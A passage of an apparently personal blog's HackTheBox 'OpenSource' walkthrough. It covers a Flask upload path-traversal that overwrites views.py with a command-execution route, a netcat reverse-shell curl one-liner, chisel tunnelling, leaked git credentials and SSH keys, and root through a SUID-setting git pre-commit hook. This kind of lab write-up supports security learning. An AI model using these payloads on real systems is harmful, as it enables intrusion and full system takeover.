+<p><figure><a class="lightgallery" href="/hackthebox-opensource/26.png" title="/etc/passwd" data-thumbnail="/hackthebox-opensource/26.png" data-sub-html="<h2>/etc/passwd</h2><p>/etc/passwd</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/26.png"
+            data-srcset="/hackthebox-opensource/26.png, /hackthebox-opensource/26.png 1.5x, /hackthebox-opensource/26.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/26.png" width="1330" height="485" />
+    </a><figcaption class="image-caption">/etc/passwd</figcaption>
+    </figure></p>
+<p>Now to crack the pin, we have the following values.</p>
+<ul>
+<li><code>root</code> would be the <code>username</code> since I didn&rsquo;t find any other user with <code>/bin/bash</code> in <code>/etc/passwd</code> file.</li>
+<li><code>flask.app</code> as <code>modname</code>.</li>
+<li><code>Flask</code> as <code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code>.</li>
+<li><code>/usr/local/lib/python3.10/site-packages/flask/app.py</code> as <code>getattr(mod, '__file__', None)</code></li>
+<li><code>2485377892356</code> as the decimal representation of <code>/sys/class/net/eth0/address</code></li>
+<li><code>d6934f3e-794c-4e48-b2f4-06bca8ac8cb153e9b96ec5190b54bcca63e76dc04e7507afdfd2805a64b64027aa3c8ed42d3f</code> as <code>proc/sys/kernel/random/boot_id</code> + <code>/proc/self/cgroup</code></li>
+</ul>
+<p>Even though I read all these values from the server the exploited PIN still wasn&rsquo;t working for some reason so I couldn&rsquo;t go further than this.</p>
+<p>Moving on.</p>
+<h4 id="manipulating-the-viewspy">Manipulating the views.py</h4>
+<p>Looking around, there&rsquo;s some filtering applied to our uploaded file path in <code>/app/app/utils.py</code> file.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/5.png" title="Upload Filtering" data-thumbnail="/hackthebox-opensource/5.png" data-sub-html="<h2>Upload Filtering</h2><p>Upload Filtering</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/5.png"
+            data-srcset="/hackthebox-opensource/5.png, /hackthebox-opensource/5.png 1.5x, /hackthebox-opensource/5.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/5.png" width="1345" height="136" />
+    </a><figcaption class="image-caption">Upload Filtering</figcaption>
+    </figure></p>
+<p>It removes <code>../</code> if we provide any.</p>
+<p>There&rsquo;s also a <code>/app/app/views.py</code> file which is defining the routes.</p>
+<p>Looking at the <code>views.py</code> file there is the usage of <code>os.path.join</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/20.png" title="Vulnerable function" data-thumbnail="/hackthebox-opensource/20.png" data-sub-html="<h2>Vulnerable function</h2><p>Vulnerable function</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/20.png"
+            data-srcset="/hackthebox-opensource/20.png, /hackthebox-opensource/20.png 1.5x, /hackthebox-opensource/20.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/20.png" width="1336" height="197" />
+    </a><figcaption class="image-caption">Vulnerable function</figcaption>
+    </figure></p>
+<h2 id="foothold">Foothold</h2>
+<p>How we will abuse this functionality is we can try overwriting this <code>views.py</code> file on the server and add another route leading to command execution.</p>
+<p>We change the <code>views.py</code> file as follows.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">from app.utils import get_file_name
+</span></span><span class="line"><span class="cl">from flask import render_template, request, send_file
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">from app import app
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/&#39;)
+</span></span><span class="line"><span class="cl">def index():
+</span></span><span class="line"><span class="cl">    return render_template(&#39;index.html&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/download&#39;)
+</span></span><span class="line"><span class="cl">def download():
+</span></span><span class="line"><span class="cl">    return send_file(os.path.join(os.getcwd(), &#34;app&#34;, &#34;static&#34;, &#34;source.zip&#34;))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/upcloud&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+</span></span><span class="line"><span class="cl">def upload_file():
+</span></span><span class="line"><span class="cl">    if request.method == &#39;POST&#39;:
+</span></span><span class="line"><span class="cl">        f = request.files[&#39;file&#39;]
+</span></span><span class="line"><span class="cl">        file_name = get_file_name(f.filename)
+</span></span><span class="line"><span class="cl">        file_path = os.path.join(os.getcwd(), &#34;public&#34;, &#34;uploads&#34;, file_name)
+</span></span><span class="line"><span class="cl">        f.save(file_path)
+</span></span><span class="line"><span class="cl">        return render_template(&#39;success.html&#39;, file_url=request.host_url + &#34;uploads/&#34; + file_name)
+</span></span><span class="line"><span class="cl">    return render_template(&#39;upload.html&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/uploads/&lt;path:path&gt;&#39;)
+</span></span><span class="line"><span class="cl">def send_report(path):
+</span></span><span class="line"><span class="cl">    path = get_file_name(path)
+</span></span><span class="line"><span class="cl">    return send_file(os.path.join(os.getcwd(), &#34;public&#34;, &#34;uploads&#34;, path))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/shell&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def rev_shell():
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    return os.system(request.args.get(&#39;cmd&#39;))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And now on <code>/upload</code> endpoint we upload our <code>views.py</code> file and manipulate the request as follows.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/6.png" title="Overwriting the views.py" data-thumbnail="/hackthebox-opensource/6.png" data-sub-html="<h2>Overwriting the views.py</h2><p>Overwriting the views.py</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/6.png"
+            data-srcset="/hackthebox-opensource/6.png, /hackthebox-opensource/6.png 1.5x, /hackthebox-opensource/6.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/6.png" width="1366" height="530" />
+    </a><figcaption class="image-caption">Overwriting the views.py</figcaption>
+    </figure></p>
+<p>Now we start a netcat listener and browse the <code>/shell</code> endpoint with a reverse shell payload.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/…/machines/opensource/app/app]
+</span></span><span class="line"><span class="cl">└─$ curl &#39;http://10.10.11.164/shell?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202&gt;%261|nc%2010.10.14.55%204444%20&gt;/tmp/f&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we got the foothold.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/…/machines/opensource/app/app]
+</span></span><span class="line"><span class="cl">└─$ nc -lvnp 4444
+</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.55] from (UNKNOWN) [10.10.11.164] 39869
+</span></span><span class="line"><span class="cl">/bin/sh: can&#39;t access tty; job control turned off
+</span></span><span class="line"><span class="cl">/app # whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">/app #
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We are inside a <code>docker</code> container as <code>root</code>.</p>
+<h3 id="analyzing-the-internal-network">Analyzing the internal network</h3>
+<p>Looking at the <code>ip</code> of our target machine we are part of <code>172.17.0.1</code> network.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/7.png" title="ip address" data-thumbnail="/hackthebox-opensource/7.png" data-sub-html="<h2>ip address</h2><p>ip address</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/7.png"
+            data-srcset="/hackthebox-opensource/7.png, /hackthebox-opensource/7.png 1.5x, /hackthebox-opensource/7.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/7.png" width="1334" height="167" />
+    </a><figcaption class="image-caption">ip address</figcaption>
+    </figure></p>
+<p>Listing the currently running services.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/8.png" title="netstat" data-thumbnail="/hackthebox-opensource/8.png" data-sub-html="<h2>netstat</h2><p>netstat</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/8.png"
+            data-srcset="/hackthebox-opensource/8.png, /hackthebox-opensource/8.png 1.5x, /hackthebox-opensource/8.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/8.png" width="1337" height="128" />
+    </a><figcaption class="image-caption">netstat</figcaption>
+    </figure></p>
+<p>From our initial nmap scan, we saw port 3000 as filtered. Since there isn&rsquo;t any service running here on port 3000 we can conclude that&rsquo;s a different instance.</p>
+<p>What we can do now is we can check for port <code>3000</code> on other ip addresses on our network.</p>
+<p>For that I uploaded a static nmap binary on the server using the <code>/upload</code> functionality.</p>
+<p>Upon manually checking the ip addresses, <code>172.17.0.1</code> has an open port <code>3000</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/9.png" title="nmap scan" data-thumbnail="/hackthebox-opensource/9.png" data-sub-html="<h2>nmap scan</h2><p>nmap scan</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/9.png"
+            data-srcset="/hackthebox-opensource/9.png, /hackthebox-opensource/9.png 1.5x, /hackthebox-opensource/9.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/9.png" width="1336" height="450" />
+    </a><figcaption class="image-caption">nmap scan</figcaption>
+    </figure></p>
+<h3 id="exposing-the-internal-port">Exposing the Internal Port</h3>
+<p>We&rsquo;ll now use <code>chisel</code> to forward this port and access on our machine.</p>
+<p>On our local machine</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/…/machines/opensource/app/app]
+</span></span><span class="line"><span class="cl">└─$ ./chisel server --reverse --port 8000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On target machine</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/app/public/uploads # ./chisel client 10.10.14.50:8000 R:3000:172.17.0.1:3000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now visiting <code>http://localhost:300/</code> on our machine will open up the website.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/10.png" title="Website on port 3000" data-thumbnail="/hackthebox-opensource/10.png" data-sub-html="<h2>Website on port 3000</h2><p>Website on port 3000</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/10.png"
+            data-srcset="/hackthebox-opensource/10.png, /hackthebox-opensource/10.png 1.5x, /hackthebox-opensource/10.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/10.png" width="1364" height="582" />
+    </a><figcaption class="image-caption">Website on port 3000</figcaption>
+    </figure></p>
+<p>It&rsquo;s a simple website but we need credentials to login to escalate further.</p>
+<h3 id="finding-the-leaked-credentials">Finding the leaked credentials</h3>
+<p>If we analyze the <code>.git</code> repo in the source code, in a previous commit there are some credentials.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/12.png" title="git log dev" data-thumbnail="/hackthebox-opensource/12.png" data-sub-html="<h2>git log dev</h2><p>git log dev</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/12.png"
+            data-srcset="/hackthebox-opensource/12.png, /hackthebox-opensource/12.png 1.5x, /hackthebox-opensource/12.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/12.png" width="1336" height="473" />
+    </a><figcaption class="image-caption">git log dev</figcaption>
+    </figure>
+<figure><a class="lightgallery" href="/hackthebox-opensource/13.png" title="git show" data-thumbnail="/hackthebox-opensource/13.png" data-sub-html="<h2>git show</h2><p>git show</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/13.png"
+            data-srcset="/hackthebox-opensource/13.png, /hackthebox-opensource/13.png 1.5x, /hackthebox-opensource/13.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/13.png" width="1331" height="485" />
+    </a><figcaption class="image-caption">git show</figcaption>
+    </figure>
+<figure><a class="lightgallery" href="/hackthebox-opensource/14.png" title="credentials" data-thumbnail="/hackthebox-opensource/14.png" data-sub-html="<h2>credentials</h2><p>credentials</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/14.png"
+            data-srcset="/hackthebox-opensource/14.png, /hackthebox-opensource/14.png 1.5x, /hackthebox-opensource/14.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/14.png" width="1337" height="453" />
+    </a><figcaption class="image-caption">credentials</figcaption>
+    </figure></p>
+<p>Now we log in with those credentials.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/15.png" title="dev01 dashboard" data-thumbnail="/hackthebox-opensource/15.png" data-sub-html="<h2>dev01 dashboard</h2><p>dev01 dashboard</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/15.png"
+            data-srcset="/hackthebox-opensource/15.png, /hackthebox-opensource/15.png 1.5x, /hackthebox-opensource/15.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/15.png" width="1355" height="576" />
+    </a><figcaption class="image-caption">dev01 dashboard</figcaption>
+    </figure></p>
+<h3 id="reading-the-private-ssh-key">Reading the private SSH key</h3>
+<p>Looking around there&rsquo;s a repo <code>home_backup</code> in which there is a <code>ssh</code> key.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/16.png" title="dev01/home_backup repo" data-thumbnail="/hackthebox-opensource/16.png" data-sub-html="<h2>dev01/home_backup repo</h2><p>dev01/home_backup repo</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/16.png"
+            data-srcset="/hackthebox-opensource/16.png, /hackthebox-opensource/16.png 1.5x, /hackthebox-opensource/16.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/16.png" width="1354" height="578" />
+    </a><figcaption class="image-caption">dev01/home_backup repo</figcaption>
+    </figure>
+<figure><a class="lightgallery" href="/hackthebox-opensource/17.png" title=".ssh folder" data-thumbnail="/hackthebox-opensource/17.png" data-sub-html="<h2>.ssh folder</h2><p>.ssh folder</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/17.png"
+            data-srcset="/hackthebox-opensource/17.png, /hackthebox-opensource/17.png 1.5x, /hackthebox-opensource/17.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/17.png" width="1365" height="577" />
+    </a><figcaption class="image-caption">.ssh folder</figcaption>
+    </figure></p>
+<p>Trying this key to login as <code>dev01</code> through <code>ssh</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/opensource]
+</span></span><span class="line"><span class="cl">└─$ ssh -i id_rsa dev01@opensource.htb                 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dev01@opensource:~$ whoami
+</span></span><span class="line"><span class="cl">dev01
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dev01@opensource:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we&rsquo;re in!</p>
+<h3 id="usertxt">user.txt</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dev01@opensource:~$ ls -al
+</span></span><span class="line"><span class="cl">total 44
+</span></span><span class="line"><span class="cl">drwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 4 root  root  4096 May 16 12:51 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx 1 dev01 dev01    9 Mar 23  2022 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 dev01 dev01  220 Apr  4  2018 .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 dev01 dev01 3771 Apr  4  2018 .bashrc
+</span></span><span class="line"><span class="cl">drwx------ 2 dev01 dev01 4096 May  4 16:35 .cache
+</span></span><span class="line"><span class="cl">drwxrwxr-x 8 dev01 dev01 4096 Oct  6 11:09 .git
+</span></span><span class="line"><span class="cl">drwx------ 3 dev01 dev01 4096 May  4 16:35 .gnupg
+</span></span><span class="line"><span class="cl">drwxrwxr-x 3 dev01 dev01 4096 May  4 16:35 .local
+</span></span><span class="line"><span class="cl">-rw-r--r-- 1 dev01 dev01  807 Apr  4  2018 .profile
+</span></span><span class="line"><span class="cl">drwxr-xr-x 2 dev01 dev01 4096 May  4 16:35 .ssh
+</span></span><span class="line"><span class="cl">-rw-r----- 1 root  dev01   33 Oct  6 11:04 user.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dev01@opensource:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">89****************************97
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dev01@opensource:~$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="analyzing-the-processes">Analyzing the processes</h3>
+<p>Analyzing the processes with <code>pspy</code>, there are some <code>git</code> commands that are being executed by <code>root</code> user.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-opensource/18.png" title="git commands running as root" data-thumbnail="/hackthebox-opensource/18.png" data-sub-html="<h2>git commands running as root</h2><p>git commands running as root</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-opensource/18.png"
+            data-srcset="/hackthebox-opensource/18.png, /hackthebox-opensource/18.png 1.5x, /hackthebox-opensource/18.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-opensource/18.png" width="1337" height="520" />
+    </a><figcaption class="image-caption">git commands running as root</figcaption>
+    </figure></p>
+<p>We can take advantage of <code>git hooks</code> and add a crafted payload in one of the hooks to escalate to root.</p>
+<h3 id="understading-the-git-hooks">Understading the git hooks</h3>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Git Hooks<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Git hooks are shell scripts found in the hidden . git/hooks directory of a Git repository. These scripts trigger actions in response to specific events, so they can help you automate your development lifecycle.</div>
+        </div>
+    </div>
+<p>Out of the <code>git hooks</code> there&rsquo;s one called <code>pre-commit</code> that lets you execute code before a commit.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>pre-commit<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">The pre-commit hook is run first, before you even type in a commit message. It&rsquo;s used to inspect the snapshot that&rsquo;s about to be committed, to see if you&rsquo;ve forgotten something, to make sure tests run, or to examine whatever you need to inspect in the code.</div>
+        </div>
+    </div>
+<h3 id="exploitation">Exploitation</h3>
+<p>We will add a <code>pre-commit</code> hook in <code>~/.git/hooks</code> folder and set the SUID bit for bash in it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dev01@opensource:~$ echo &#34;chmod u+s /bin/bash&#34; &gt;&gt; ~/.git/hooks/pre-commit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dev01@opensource:~$ chmod +x ~/.git/hooks/pre-commit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dev01@opensource:~$ ls -al /bin/bash 
+</span></span><span class="line"><span class="cl">-rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dev01@opensource:~$ bash -p
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash-4.4# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash-4.4#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="roottxt">root.txt</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash-4.4# ls -al
+</span></span><span class="line"><span class="cl">total 68
+</span></span><span class="line"><span class="cl">drwx------  9 root  root  4096 May 20 09:32 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 24 root  root  4096 May  4 16:35 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx  1 root  root     9 Mar 23  2022 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root  root  3106 Apr  9  2018 .bashrc
+</span></span><span class="line"><span class="cl">drwx------  2 root  root  4096 May  4 16:35 .cache
+</span></span><span class="line"><span class="cl">-rw-rw-r--  1 dev01 dev01  269 May  2 23:43 config
+</span></span><span class="line"><span class="cl">drwx------  3 root  root  4096 May  4 16:35 .config
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root  root   107 Apr 21 15:38 .gitconfig
+</span></span><span class="line"><span class="cl">-rw-------  1 root  root    61 May 16 12:51 .git-credentials
+</span></span><span class="line"><span class="cl">drwx------  3 root  root  4096 May  4 16:35 .gnupg
+</span></span><span class="line"><span class="cl">drwxr-xr-x  3 root  root  4096 May  4 16:35 .local
+</span></span><span class="line"><span class="cl">drwxr-xr-x  4 root  root  4096 May 20 12:38 meta
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root  root   148 Aug 17  2015 .profile
+</span></span><span class="line"><span class="cl">-rw-r-----  1 root  root    33 Oct  6 11:37 root.txt
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root  root    66 May 20 09:32 .selected_editor
+</span></span><span class="line"><span class="cl">drwx------  3 root  root  4096 May  4 16:35 snap
+</span></span><span class="line"><span class="cl">drwx------  2 root  root  4096 May  4 16:35 .ssh
+</span></span><span class="line"><span class="cl">-rw-r--r--  1 root  root   165 Apr 27 20:21 .wget-hsts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash-4.4# cat root.txt 
+</span></span><span class="line"><span class="cl">4f****************************72
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bash-4.4#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-10-05</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-opensource/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackthebox-opensource/" data-title="HackTheBox - OpenSource" data-via="ssaadakhtarr" data-hashtags="hackthebox,machines"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackthebox-opensource/" data-hashtag="hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackthebox-opensource/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/machines/">machines</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hackthebox-timelapse/" class="prev" rel="prev" title="HackTheBox - Timelapse"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Timelapse</a>
+            <a href="/hackthebox-trick/" class="next" rel="next" title="HackTheBox - Trick">HackTheBox - Trick<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
